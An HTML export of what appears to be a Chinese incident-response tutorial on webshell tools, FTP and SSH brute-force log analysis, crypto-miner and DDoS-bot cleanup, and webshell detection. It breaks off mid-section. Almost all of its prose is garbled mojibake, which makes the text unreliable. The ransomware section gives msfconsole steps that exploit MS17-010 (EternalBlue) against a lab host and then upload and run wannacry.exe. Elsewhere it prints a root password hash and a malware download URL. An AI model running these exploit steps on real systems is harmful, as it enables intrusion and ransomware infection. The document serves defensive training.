ä¸­å›½èœåˆ€æ˜¯ä¸€æ¬¾ä¸“ä¸šçš„ç½‘ç«™ç®¡ç†è½¯ä»¶ï¼Œç”¨é€”å¹¿æ³›ï¼Œä½¿ç”¨æ–¹ä¾¿ï¼Œå°å·§å®ç”¨ã€‚åªè¦æ”¯æŒåŠ¨æ€è„šæœ¬çš„ç½‘ç«™ï¼Œéƒ½å¯ä»¥ç”¨ä¸­å›½èœåˆ€æ¥è¿›è¡Œç®¡ç†ã€‚åœ¨éç®€ä½“ä¸­æ–‡ç¯å¢ƒä¸‹ä½¿ç”¨ï¼Œè‡ªåŠ¨åˆ‡æ¢åˆ°è‹±æ–‡ç•Œé¢ã€‚UNICODEæ–¹å¼ç¼–è¯‘ï¼Œæ”¯æŒå¤šå›½è¯­è¨€è¾“å…¥æ˜¾ç¤ºã€‚æ”»å‡»ç‰¹å¾æ¯”è¾ƒæ˜æ˜¾æ²¡æœ‰åšåŠ å¯†ï¼Œå®¹æ˜“è¢«å„å®‰å…¨è®¾å¤‡æ£€æµ‹åˆ°ã€‚<br>
</p>

<p>
å·¥å…·åœ°å€ï¼š<a href="https://github.com/Chora10/Cknife">https://github.com/Chora10/Cknife</a><br>
</p>


<figure id="org74eed17">
<img src="./images/img_20230817_140615.png" alt="img_20230817_140615.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-org153bab9" class="outline-4">
<h4 id="org153bab9">èšå‰‘</h4>
<div class="outline-text-4" id="text-org153bab9">
<p>
AntSwordæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç ï¼Œè·¨å¹³å°çš„ç½‘ç«™ç®¡ç†å·¥å…·ï¼Œæ—¨åœ¨æ»¡è¶³æ¸—é€æµ‹è¯•äººå‘˜ä»¥åŠå…·æœ‰æƒé™å’Œ/æˆ–æˆæƒçš„å®‰å…¨ç ”ç©¶äººå‘˜ä»¥åŠç½‘ç«™ç®¡ç†å‘˜çš„éœ€æ±‚ã€‚<br>
å·¥å…·åœ°å€ï¼š<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a><br>
</p>


<figure id="org4dffbd4">
<img src="./images/img_20230817_140628.png" alt="img_20230817_140628.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-org46f5ab3" class="outline-4">
<h4 id="org46f5ab3">å†°è</h4>
<div class="outline-text-4" id="text-org46f5ab3">
<p>
å†°èæ˜¯ä¸€æ¬¾åŠ¨æ€äºŒè¿›åˆ¶åŠ å¯†ç½‘ç«™ç®¡ç†å®¢æˆ·ç«¯ã€‚javaå¼€å‘ã€‚æœ€å¤§çš„ç‰¹ç‚¹æ˜¯ä¼šå¯¹äº¤äº’çš„æµé‡è¿›è¡Œä¸€ä¸ªaeså¯¹ç§°åŠ å¯†å¹¶ç”¨åŠ å¯†çš„å¯†é’¥æ˜¯éšæœºç”Ÿæˆçš„ï¼Œå®¢æˆ·ç«¯çš„æµé‡å‡ ä¹å¾ˆéš¾åšæ£€æµ‹ã€‚<br>
å·¥å…·åœ°å€ï¼š<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a><br>
</p>


<figure id="org3b69e7f">
<img src="./images/img_20230817_140649.png" alt="img_20230817_140649.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-org3210d73" class="outline-4">
<h4 id="org3210d73">å“¥æ–¯æ‹‰</h4>
<div class="outline-text-4" id="text-org3210d73">
<p>
å“¥æ–¯æ‹‰æ˜¯ä¸€æ¬¾ä¼˜ç§€çš„æƒé™ç®¡ç†å·¥å…·ï¼Œå†…ç½®äº†3ç§Payloadä»¥åŠ6ç§åŠ å¯†å™¨ï¼Œ6ç§æ”¯æŒè„šæœ¬åç¼€ï¼Œ20ä¸ªå†…ç½®æ’ä»¶ã€‚<br>
å·¥å…·åœ°å€ï¼š<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a><br>
</p>


<figure id="org0ac092c">
<img src="./images/img_20230817_140709.png" alt="img_20230817_140709.png" width="60%"><br>

</figure>
</div>
</div>
</div>
</section>
<section id="outline-container-org941804b" class="outline-2">
<h2 id="org941804b">Windows å®æˆ˜</h2>
<div class="outline-text-2" id="text-org941804b">
<p>
ä¸»è¦å†…å®¹ï¼š<br>
</p>
<ul class="org-ul">
<li>FTP æš´åŠ›ç ´è§£<br></li>
<li>å‹’ç´¢ç—…æ¯’<br></li>
<li>æŒ–çŸ¿ç—…æ¯’<br></li>
</ul>
</div>
<div id="outline-container-org9351792" class="outline-3">
<h3 id="org9351792">FTPæš´åŠ›ç ´è§£</h3>
<div class="outline-text-3" id="text-org9351792">
<p>
FTPæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¼ è¾“åè®®ï¼Œç”¨æˆ·é€šè¿‡FTPå¯ä»å®¢æˆ·æœºç¨‹åºå‘è¿œç¨‹ä¸»æœºä¸Šä¼ æˆ–ä¸‹è½½æ–‡ä»¶ï¼Œå¸¸ç”¨äºç½‘ç«™ä»£ç ç»´æŠ¤ã€æ—¥å¸¸æºç å¤‡ä»½ç­‰ã€‚å¦‚æœæ”»å‡»è€…é€šè¿‡FTPåŒ¿åè®¿é—®æˆ–è€…å¼±å£ä»¤è·å–FTPæƒé™ï¼Œå¯ç›´æ¥ä¸Šä¼ webshellï¼Œè¿›ä¸€æ­¥æ¸—é€ææƒï¼Œç›´è‡³æ§åˆ¶æ•´ä¸ªç½‘ç«™æœåŠ¡å™¨ã€‚<br>
</p>

<p>
eventvwr.mscï¼Œå‘ç°å¤§é‡ç™»å½•ä»»åŠ¡ç±»åˆ«ã€‚<br>
</p>


<figure id="orgce8fa77">
<img src="./images/img_20230817_140745.png" alt="img_20230817_140745.png" width="60%"><br>

</figure>

<p>
ç­›é€‰å½“å‰æ—¥å¿—ï¼Œäº‹ä»¶idå¡«å†™4625<br>
</p>


<figure id="orgff4325d">
<img src="./images/img_20230817_140759.png" alt="img_20230817_140759.png" width="60%"><br>

</figure>

<p>
å‘ç°å­˜åœ¨1248æ¡ï¼ŒçŒœæµ‹æœåŠ¡å™¨æ­£åœ¨è¢«äººæš´åŠ›ç ´è§£ã€‚<br>
</p>


<figure id="orgd021fde">
<img src="./images/img_20230817_140852.png" alt="img_20230817_140852.png" width="60%"><br>

</figure>

<p>
å°†ç­›é€‰å‡ºæ¥çš„æ—¥å¿—å¦å­˜ä¸ºï¼šæš´åŠ›ç ´è§£<br>
</p>


<figure id="org45f1b25">
<img src="./images/img_20230817_140908.png" alt="img_20230817_140908.png" width="60%"><br>

</figure>

<p>
è¿›ä¸€æ­¥ä½¿ç”¨Log Parserå¯¹æ—¥å¿—æå–æ•°æ®åˆ†æï¼Œå‘ç°æ”»å‡»è€…ä½¿ç”¨äº†å¤§é‡çš„ç”¨æˆ·åè¿›è¡Œçˆ†ç ´ï¼Œä¾‹å¦‚ç”¨æˆ·åï¼šfxxxï¼Œå…±è®¡è¿›è¡Œäº†17826æ¬¡å£ä»¤å°è¯•ï¼Œæ”»å‡»è€…åŸºäºâ€œfxxxâ€è¿™æ ·ä¸€ä¸ªåŸŸåä¿¡æ¯ï¼Œæ„é€ äº†ä¸€ç³»åˆ—çš„ç”¨æˆ·åå­—å…¸è¿›è¡Œæœ‰é’ˆå¯¹æ€§è¿›è¡Œçˆ†ç ´ï¼Œå¦‚ä¸‹å›¾ï¼š<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">LogParser.exe -i:EVT <span style="color: #8b2252;">"SELECT EXTRACT_TOKEN(Message,13,' ') as EventType,EXTRACT_TOKEN(Message,19,' ') as user,count(EXTRACT_TOKEN(Message,19,' ')) as times,EXTRACT_TOKEN(Message,38,' ') as Loginip FROM &#26292;&#21147;&#30772;&#35299;.evtx where EventID=4625 group by message"</span>
</pre>
</div>


<figure id="org26e2b69">
<img src="./images/img_20230817_141016.png" alt="img_20230817_141016.png" width="60%"><br>

</figure>

<p>
å‘ç°EventTypeä¸º8çš„æ—¶å€™æ”»å‡»è€…è¿›è¡Œçˆ†ç ´æ¬¡æ•°æœ€å¤šã€‚<br>
</p>

<p>
ç™»å½•ç±»å‹8ï¼šä¸ºç½‘ç»œæ˜æ–‡ï¼ˆNetworkCleartextï¼‰<br>
</p>

<p>
è¿™ç§ç™»å½•è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªåƒç±»å‹3ä¸€æ ·çš„ç½‘ç»œç™»å½•ï¼Œä½†æ˜¯è¿™ç§ç™»å½•çš„å¯†ç åœ¨ç½‘ç»œä¸Šæ˜¯é€šè¿‡æ˜æ–‡ä¼ è¾“çš„ï¼ŒWindowsServeræœåŠ¡æ˜¯ä¸å…è®¸é€šè¿‡æ˜æ–‡éªŒè¯è¿æ¥åˆ°å…±äº«æ–‡ä»¶å¤¹æˆ–æ‰“å°æœºçš„ï¼Œé€šå¸¸åªæœ‰å½“ä»ä¸€ä¸ªä½¿ç”¨Advapiçš„ASPè„šæœ¬ç™»å½•æˆ–è€…ä¸€ä¸ªç”¨æˆ·ä½¿ç”¨åŸºæœ¬éªŒè¯æ–¹å¼ç™»å½•IISæ‰ä¼šæ˜¯è¿™ç§ç™»å½•ç±»å‹ã€‚â€œç™»å½•è¿‡ç¨‹â€æ éƒ½å°†åˆ—å‡ºAdvapiã€‚æˆ‘ä»¬æ¨æµ‹å¯èƒ½æ˜¯FTPæœåŠ¡ï¼š<br>
</p>


<figure id="org555e8a6">
<img src="./images/img_20230817_141052.png" alt="img_20230817_141052.png" width="60%"><br>

</figure>

<p>
<b>åº”æ€¥å¤„ç†æªæ–½ï¼š</b><br>
1ã€å…³é—­å¤–ç½‘FTPç«¯å£æ˜ å°„<br>
2ã€åˆ é™¤æœ¬åœ°æœåŠ¡å™¨FTPæµ‹è¯•<br>
3ã€ç¦æ­¢ä½¿ç”¨FTPä¼ è¾“æ–‡ä»¶ï¼Œè‹¥å¿…é¡»å¼€æ”¾åº”é™å®šç®¡ç†IPåœ°å€å¹¶åŠ å¼ºå£ä»¤å®‰å…¨å®¡è®¡ï¼ˆå£ä»¤é•¿åº¦ä¸ä½äº8ä½ï¼Œç”±æ•°å­—ã€å¤§å°å†™å­—æ¯ã€ç‰¹æ®Šå­—ç¬¦ç­‰è‡³å°‘ä¸¤ç§ä»¥ä¸Šç»„åˆæ„æˆï¼‰ã€‚<br>
4ã€æ›´æ”¹æœåŠ¡å™¨FTPé»˜è®¤ç«¯å£ã€‚<br>
5ã€éƒ¨ç½²å…¥ä¾µæ£€æµ‹è®¾å¤‡ï¼Œå¢å¼ºå®‰å…¨é˜²æŠ¤ã€‚<br>
</p>
</div>
</div>
<div id="outline-container-org6922ddf" class="outline-3">
<h3 id="org6922ddf">å‹’ç´¢ç—…æ¯’</h3>
<div class="outline-text-3" id="text-org6922ddf">
<p>
â€œæ°¸æ’ä¹‹è“â€åˆ©ç”¨Windowsç³»ç»Ÿçš„SMBæ¼æ´è·å–ç³»ç»Ÿçš„æœ€é«˜æƒé™ï¼Œè¯¥å·¥å…·é€šè¿‡æ¶æ„ä»£ç æ‰«æå¼€æ”¾445ç«¯å£çš„Windowsç³»ç»Ÿï¼›è¢«æ‰«æåˆ°çš„Windowsç³»ç»Ÿï¼Œåªè¦å¼€æœºä¸Šçº¿ï¼Œä¸è¦è¦ç”¨æˆ·è¿›è¡Œä»»ä½•æ“ä½œï¼Œå³å¯é€šè¿‡å…±äº«æ¼æ´ä¸Šä¼ wannacryå‹’ç´¢ç—…æ¯’ï¼Œè¿œç¨‹æ§åˆ¶æœ¨é©¬ç­‰æ¶æ„ç¨‹åºã€‚<br>
</p>

<p>
WannaCryæ˜¯åœ¨æ°¸æ’ä¹‹è“çš„åŸºç¡€ä¸Šäº§ç”Ÿçš„ï¼Œå› æ­¤éœ€è¦å…ˆé€šè¿‡æ°¸æ’ä¹‹è“è·å¾—shellæƒé™ã€‚<br>
</p>

<p>
æ°¸æ’ä¹‹è“çš„ç¼–å·æ˜¯MS17-010ï¼Œå…ˆä½¿ç”¨msfconsoleæœç´¢ä¸€ä¸‹æ¼æ´æ¨¡å—<br>
</p>


<figure id="org3ffaa92">
<img src="./images/img_20230817_141205.png" alt="img_20230817_141205.png" width="60%"><br>

</figure>

<p>
ä½¿ç”¨æ‰«ææ¨¡å—è¿›è¡Œæ‰«æ<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">use auxiliary/scanner/smb/smb_ms17_010
<span style="color: #483d8b;">set</span> rhosts 192.168.85.188
<span style="color: #483d8b;">set</span> rport 445

exploit
</pre>
</div>

<p>
å‘ç°ç›®æ ‡ä¸»æœºå­˜åœ¨ms17-010æ¼æ´<br>
</p>


<figure id="org971bab0">
<img src="./images/img_20230817_141313.png" alt="img_20230817_141313.png" width="60%"><br>

</figure>

<p>
æ¥ä¸‹æ¥ä½¿ç”¨æ”»å‡»æ¨¡å—è¿›è¡Œæ”»å‡»<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">use exploit/windows/smb/ms17_010_eternalblue
<span style="color: #483d8b;">set</span> rhosts 192.168.85.188
exploit
</pre>
</div>

<p>
æ”»å‡»æˆåŠŸï¼Œä¸Šä¼ WannaCryç—…æ¯’ï¼Œupload <i>tmp/wannacry.exe c:/</i><br>
ç„¶åæ‰§è¡Œwannacry.exeï¼Œå‘ç°ä¸»æœºç³»ç»Ÿå·²ç»è¢«å‹’ç´¢ç—…æ¯’æ”»å‡»ï¼š<br>
</p>


<figure id="orgecf1e9b">
<img src="./images/img_20230817_141510.png" alt="img_20230817_141510.png" width="60%"><br>

</figure>

<p>
ä¸€æ—¦ä¸­äº†å‹’ç´¢ç—…æ¯’ï¼Œæ–‡ä»¶ä¼šè¢«é”æ­»ï¼Œæ²¡æœ‰åŠæ³•æ­£å¸¸è®¿é—®äº†ï¼Œè¿™æ—¶å€™ï¼Œä¼šç»™ä½¿ç”¨è€…å¸¦æ¥æå¤§çš„å›°æ¼ã€‚ä¸ºäº†é˜²èŒƒè¿™æ ·çš„äº‹æƒ…å‡ºç°ï¼Œæˆ‘ä»¬ç”µè„‘ä¸Šè¦å…ˆåšå¥½ä¸€äº›é˜²èŒƒæªæ–½ï¼š<br>
</p>
<ol class="org-ol">
<li>å®‰è£…æ€æ¯’è½¯ä»¶ï¼Œä¿æŒç›‘æ§å¼€å¯ï¼Œå®šæœŸå…¨ç›˜æ‰«æ<br></li>
<li>åŠæ—¶æ›´æ–° Windowså®‰å…¨è¡¥ä¸ï¼Œå¼€å¯é˜²ç«å¢™ä¸´æ—¶å…³é—­ç«¯å£ï¼Œå¦‚445ã€135ã€137ã€138ã€139ã€3389ç­‰ç«¯å£<br></li>
<li>åŠæ—¶æ›´æ–°webæ¼æ´è¡¥ä¸ï¼Œå‡çº§webç»„ä»¶<br></li>
<li>å¤‡ä»½ã€‚é‡è¦çš„èµ„æ–™ä¸€å®šè¦å¤‡ä»½ï¼Œè°¨é˜²èµ„æ–™ä¸¢å¤±<br></li>
<li>å¼ºåŒ–ç½‘ç»œå®‰å…¨æ„è¯†ï¼Œé™Œç”Ÿé“¾æ¥ä¸ç‚¹å‡»ï¼Œé™Œç”Ÿæ–‡ä»¶ä¸è¦ä¸‹è½½ï¼Œé™Œç”Ÿé‚®ä»¶ä¸è¦æ‰“å¼€<br></li>
</ol>
</div>
</div>
<div id="outline-container-orge3e21e4" class="outline-3">
<h3 id="orge3e21e4">æŒ–çŸ¿ç—…æ¯’</h3>
<div class="outline-text-3" id="text-orge3e21e4">
<p>
éšç€è™šæ‹Ÿè´§å¸çš„ç–¯ç‹‚ç‚’ä½œï¼ŒæŒ–çŸ¿ç—…æ¯’å·²ç»æˆä¸ºä¸æ³•åˆ†å­åˆ©ç”¨æœ€ä¸ºé¢‘ç¹çš„æ”»å‡»æ–¹å¼ä¹‹ä¸€ã€‚ç—…æ¯’ä¼ æ’­è€…å¯ä»¥åˆ©ç”¨ä¸ªäººç”µè„‘æˆ–æœåŠ¡å™¨è¿›è¡ŒæŒ–çŸ¿ï¼Œå…·ä½“ç°è±¡ä¸ºç”µè„‘CPUå ç”¨ç‡é«˜ï¼ŒCç›˜å¯ä½¿ç”¨ç©ºé—´éª¤é™ï¼Œç”µè„‘æ¸©åº¦å‡é«˜ï¼Œé£æ‰‡å™ªå£°å¢å¤§ç­‰é—®é¢˜ã€‚<br>
</p>

<p>
<b>æŒ–çŸ¿ç—…æ¯’æ¡ˆä¾‹ï¼š</b><br>
æŸå¤©ä¸Šåˆé‡å¯æœåŠ¡å™¨çš„æ—¶å€™ï¼Œå‘ç°ç¨‹åºå¯åŠ¨å¾ˆæ…¢ï¼Œæ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ï¼Œå‘ç°cpuè¢«å ç”¨æ¥è¿‘100%ï¼ŒæœåŠ¡å™¨èµ„æºå ç”¨ä¸¥é‡ã€‚<br>
</p>


<figure id="org4082a74">
<img src="./images/img_20230817_141704.png" alt="img_20230817_141704.png" width="60%"><br>

</figure>

<p>
ç™»å½•ç½‘ç«™æœåŠ¡å™¨è¿›è¡Œæ’æŸ¥ï¼Œå‘ç°å¤šä¸ªå¼‚å¸¸è¿›ç¨‹ï¼š<br>
</p>


<figure id="orgea59b5d">
<img src="./images/img_20230817_141718.png" alt="img_20230817_141718.png" width="60%"><br>

</figure>

<p>
åˆ†æè¿›ç¨‹å‚æ•°ï¼šwmic process get caption,commandline /value &gt;&gt; tmp.txt<br>
</p>


<figure id="org1fef05e">
<img src="./images/img_20230817_141739.png" alt="img_20230817_141739.png" width="60%"><br>

</figure>

<p>
è®¿é—®è¯¥é“¾æ¥ï¼š<a href="http://45.123.190.178/win.txt">http://45.123.190.178/win.txt</a><br>
</p>


<figure id="org4b41249">
<img src="./images/img_20230817_141755.png" alt="img_20230817_141755.png" width="60%"><br>

</figure>

<p>
Tempç›®å½•ä¸‹å‘ç°Carbonã€run.batæŒ–çŸ¿ç¨‹åº:<br>
</p>


<figure id="org92270e6">
<img src="./images/img_20230817_141819.png" alt="img_20230817_141819.png" width="60%"><br>

</figure>

<p>
æ¸…é™¤æŒ–çŸ¿ç—…æ¯’ï¼šå…³é—­å¼‚å¸¸è¿›ç¨‹ã€åˆ é™¤cç›˜tempç›®å½•ä¸‹æŒ–çŸ¿ç¨‹åº ã€‚<br>
</p>
</div>
</div>
</section>
<section id="outline-container-org0b7dc13" class="outline-2">
<h2 id="org0b7dc13">Linux å®æˆ˜</h2>
<div class="outline-text-2" id="text-org0b7dc13">
</div>
<div id="outline-container-orgc418c0a" class="outline-3">
<h3 id="orgc418c0a">SSHæš´åŠ›ç ´è§£</h3>
<div class="outline-text-3" id="text-orgc418c0a">
<p>
SSH æ˜¯ç›®å‰è¾ƒå¯é ï¼Œä¸“ä¸ºè¿œç¨‹ç™»å½•ä¼šè¯å’Œå…¶ä»–ç½‘ç»œæœåŠ¡æä¾›å®‰å…¨æ€§çš„åè®®ï¼Œä¸»è¦ç”¨äºç»™è¿œç¨‹ç™»å½•ä¼šè¯æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œä¿è¯æ•°æ®ä¼ è¾“çš„å®‰å…¨ã€‚SSHå£ä»¤é•¿åº¦å¤ªçŸ­æˆ–è€…å¤æ‚åº¦ä¸å¤Ÿï¼Œå¦‚ä»…åŒ…å«æ•°å­—ï¼Œæˆ–ä»…åŒ…å«å­—æ¯ç­‰ï¼Œå®¹æ˜“è¢«æ”»å‡»è€…ç ´è§£ï¼Œä¸€æ—¦è¢«æ”»å‡»è€…è·å–ï¼Œå¯ç”¨æ¥ç›´æ¥ç™»å½•ç³»ç»Ÿï¼Œæ§åˆ¶æœåŠ¡å™¨æ‰€æœ‰æƒé™ã€‚<br>
</p>

<p>
æ—¥å¿—åˆ†æï¼š<br>
SSHç«¯å£å¼‚å¸¸ï¼Œæˆ‘ä»¬é¦–å…ˆæœ‰å¿…è¦å…ˆæ¥äº†è§£ä¸€ä¸‹ç³»ç»Ÿè´¦å·æƒ…å†µï¼š<br>
</p>

<p>
<b>1ã€ç³»ç»Ÿè´¦å·æƒ…å†µ</b><br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#38500;root&#20043;&#22806;&#65292;&#26159;&#21542;&#36824;&#26377;&#20854;&#23427;&#29305;&#26435;&#29992;&#25143;(uid &#20026;0)
[root@localhost ~]# awk -F: <span style="color: #8b2252;">'$3==0{print $1}'</span> /etc/passwd
root

2&#12289;&#21487;&#20197;&#36828;&#31243;&#30331;&#24405;&#30340;&#36134;&#21495;&#20449;&#24687;
[root@localhost ~]# awk <span style="color: #8b2252;">'/\$1|\$6/{print $1}'</span> /etc/shadow
root:$<span style="color: #a0522d;">6</span>$<span style="color: #a0522d;">38</span>cKfZDjsTiUe58V$<span style="color: #a0522d;">FP</span>.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nU bbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7:::
</pre>
</div>

<p>
å¯ä»¥ç¡®è®¤ç›®å‰ç³»ç»Ÿåªæœ‰ä¸€ä¸ªç®¡ç†ç”¨æˆ·rootã€‚<br>
/var/log/auth.logï¼Œè¿™ä¸ªæ—¥å¿—æ–‡ä»¶è®°å½•äº†éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯ï¼Œåªè¦æ¶‰åŠè´¦å·å’Œå¯†ç çš„ç¨‹åºéƒ½ä¼šè¿›è¡Œè®°å½•ã€‚<br>
</p>

<p>
<b>2ã€ç¡®è®¤æ”»å‡»æƒ…å†µ</b><br>
</p>

<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#32479;&#35745;&#20102;&#19979;&#26085;&#24535;&#65292;&#21457;&#29616;&#22823;&#32422;&#26377;126254&#27425;&#30331;&#24405;&#22833;&#36133;&#30340;&#35760;&#24405;&#65292;&#30830;&#35748;&#26381;&#21153;&#22120;&#36973;&#21463;&#26292;&#21147;&#30772;&#35299;
[root@localhost ~]# grep -o <span style="color: #8b2252;">"Failed password"</span> /var/log/auth.log|uniq -c
    340 Failed password

2&#12289;&#36755;&#20986;&#30331;&#24405;&#29190;&#30772;&#30340;&#31532;&#19968;&#34892;&#21644;&#26368;&#21518;&#19968;&#34892;&#65292;&#30830;&#35748;&#29190;&#30772;&#26102;&#38388;&#33539;&#22260;&#65306;
[root@localhost ~]# grep <span style="color: #8b2252;">"Failed password"</span> /var/log/auth.log|head -1
Apr 17 02:49:50 iZf4lv0p98ie33Z sshd[2254791]: Failed password for invalid user suprodip from 81.200.212.13 port 53142 ssh2
[root@localhost ~]# grep <span style="color: #8b2252;">"Failed password"</span> /var/log/auth.log|tail -1
Apr 20 07:58:27 iZf4lv0p98ie33Z sshd[2309531]: Failed password for invalid user dspace from 92.255.85.135 port 58190 ssh2

3&#12289;&#36827;&#19968;&#27493;&#23450;&#20301;&#26377;&#21738;&#20123;IP&#22312;&#29190;&#30772;&#65311;
[root@localhost ~]# grep <span style="color: #8b2252;">"Failed password"</span> /var/log/auth.log|grep -E -o <span style="color: #8b2252;">"(25[0- 5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0- 5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"</span>|uniq -c | sort -nr
173 31.184.198.71
12 31.184.198.71
7 147.182.139.154
6 103.47.50.211
... ...

4&#12289;&#29190;&#30772;&#29992;&#25143;&#21517;&#23383;&#20856;&#37117;&#26377;&#21738;&#20123;&#65311;
[root@localhost ~]# grep <span style="color: #8b2252;">"Failed password"</span> /var/log/auth.log|perl -e <span style="color: #8b2252;">'while($_= &lt;&gt;){ /for(.*?) from/; print "$1\n";}'</span>|uniq -c|sort -nr
135 invalid user 111111
18 invalid user 123
15 invalid user
12 invalid user 123
11 root
3 root
... ...
</pre>
</div>
</div>
</div>
<div id="outline-container-org42bab92" class="outline-3">
<h3 id="org42bab92">DDOSç—…æ¯’</h3>
<div class="outline-text-3" id="text-org42bab92">
<p>
ç°è±¡æè¿°ï¼šæŸæœåŠ¡å™¨ç½‘ç»œèµ„æºå¼‚å¸¸ï¼Œæ„ŸæŸ“è¯¥æœ¨é©¬ç—…æ¯’çš„æœåŠ¡å™¨ä¼šå ç”¨ç½‘ç»œå¸¦å®½ï¼Œç”šè‡³å½±å“ç½‘ç»œä¸šåŠ¡æ­£å¸¸åº”ç”¨ã€‚<br>
</p>

<p>
ç³»ç»Ÿåˆ†æï¼šé’ˆå¯¹æ—¥å¿—æœåŠ¡å™¨ç—…æ¯’äº‹ä»¶è¿›è¡Œæ’æŸ¥ï¼Œåœ¨å¼€æœºå¯åŠ¨é¡¹/etc/rc.d/rc.localå‘ç°å¯ç–‘çš„sh.shè„šæœ¬ï¼Œè¿›ä¸€æ­¥è·Ÿè¸ªsh.shè„šæœ¬ï¼Œè¿™æ˜¯ä¸€ä¸ªæ£€æµ‹ç—…æ¯’å­˜æ´»çš„è„šæœ¬ã€‚<br>
</p>

<p>
åœ¨rootç›®å½•ä¸‹å‘ç°å­˜æ´»æ£€æµ‹è„šæœ¬<br>
</p>


<figure id="org8e2d915">
<img src="./images/img_20230817_142352.png" alt="img_20230817_142352.png" width="60%"><br>

</figure>

<p>
è§£å†³æ­¥éª¤<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">1&#12289;&#32467;&#26463;&#36827;&#31243;ps aux | grep <span style="color: #8b2252;">"conf.m"</span> | grep -v grep | awk &#8216;{print $<span style="color: #a0522d;">2</span>}&#8216;| xargs kill -9

2&#12289;&#28165;&#38500;&#33258;&#21160;&#21551;&#21160;&#33050;&#26412;vim /etc/rc.local &#21435;&#25481; sh /etc/chongfu.sh &amp;

3&#12289;&#28165;&#38500; &#33050;&#26412; rm -rf /etc/chongfu.sh /tem/chongfu.sh

4&#12289;&#20462;&#25913;&#30331;&#24405;&#23494;&#30721; passwd 5&#12289;&#37325;&#21551;&#65292;reboot
</pre>
</div>
</div>
</div>
</section>
<section id="outline-container-org34e9e61" class="outline-2">
<h2 id="org34e9e61">Web å®æˆ˜</h2>
<div class="outline-text-2" id="text-org34e9e61">
<p>
ä¸»è¦å†…å®¹ï¼š<br>
</p>
<ul class="org-ul">
<li>ç½‘ç«™è¢«æ¤å…¥ webshell<br></li>
<li>æ‰¹é‡æŒ‚é»‘é¡µ<br></li>
<li>æ–°é—»æºç½‘ç«™åŠ«æŒ<br></li>
<li>æœç´¢å¼•æ“åŠ«æŒ<br></li>
<li>ç½‘ç«™é¦–é¡µè¢«ç¯¡æ”¹<br></li>
<li>ç®¡ç†å‘˜è´¦å·è¢«ç¯¡æ”¹<br></li>
<li>ç¼–è¾‘å™¨å…¥ä¾µäº‹ä»¶<br></li>
<li>åº”æ€¥å“åº”æŠ¥å‘Šæ¨¡æ¿<br></li>
</ul>
</div>
<div id="outline-container-org59224df" class="outline-3">
<h3 id="org59224df">ç½‘ç«™è¢«æ¤å…¥Webshell</h3>
<div class="outline-text-3" id="text-org59224df">
<p>
<b>ä½¿ç”¨ç¯å¢ƒï¼šWindows Server 2008 + phpstudy + DVWA</b><br>
</p>

<p>
ç½‘ç«™è¢«æ¤å…¥Webshellï¼Œæ„å‘³ç€ç½‘ç«™å­˜åœ¨å¯åˆ©ç”¨çš„é«˜å±æ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡åˆ©ç”¨æ¼æ´å…¥ä¾µç½‘ç«™ï¼Œå†™å…¥Webshellæ¥ç®¡ç½‘ç«™çš„æ§åˆ¶æƒã€‚ä¸ºäº†å¾—åˆ°æƒé™ ï¼Œå¸¸è§„çš„æ‰‹æ®µå¦‚ï¼šå‰åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ŒSqlæ³¨å…¥å†™å…¥æ–‡ä»¶ç­‰ã€‚<br>
</p>

<p>
ç½‘ç«™ç®¡ç†å‘˜åœ¨ç«™ç‚¹ç›®å½•ä¸‹å‘ç°å­˜åœ¨webshellï¼Œäºæ˜¯å¼€å§‹äº†å¯¹å…¥ä¾µè¿‡ç¨‹å±•å¼€äº†åˆ†æã€‚å‘ç°è¢«webç›®å½•è¢«æ¤å…¥äº†Webshellï¼š<br>
</p>


<figure id="org2a65d5d">
<img src="./images/img_20230817_142521.png" alt="img_20230817_142521.png" width="60%"><br>

</figure>

<p>
WebshellæŸ¥æ€å·¥å…·<br>
</p>
<ul class="org-ul">
<li>Dç›¾_WebæŸ¥æ€ <a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a><br></li>
<li>æ²³é©¬ <a href="https://www.shellpub.com">https://www.shellpub.com</a><br></li>
<li>ç­‰<br></li>
</ul>

<p>
ä½¿ç”¨æ–¹æ³•<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">wget http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz
tar xvf hm-linux-amd64.tgz
hm scan /www
</pre>
</div>

<p>
äº‹ä»¶åˆ†æï¼Œé€šè¿‡å‘ç°çš„webshellæ–‡ä»¶åˆ›å»ºæ—¶é—´ç‚¹ï¼Œå»ç¿»çœ‹ç›¸å…³æ—¥æœŸçš„è®¿é—®æ—¥å¿—ã€‚<br>
</p>


<figure id="orgb846e2f">
<img src="./images/img_20230817_144224.png" alt="img_20230817_144224.png" width="60%"><br>

</figure>

<p>
Webæ—¥å¿—åˆ†æ<br>
</p>

<p>
ç»è¿‡æ—¥å¿—åˆ†æï¼Œåœ¨æ–‡ä»¶åˆ›å»ºçš„æ—¶é—´èŠ‚ç‚¹å‘ç°å¯ç–‘çš„ä¸Šä¼ æ¥å£ï¼šcat /var/log/apache2/access.log<br>
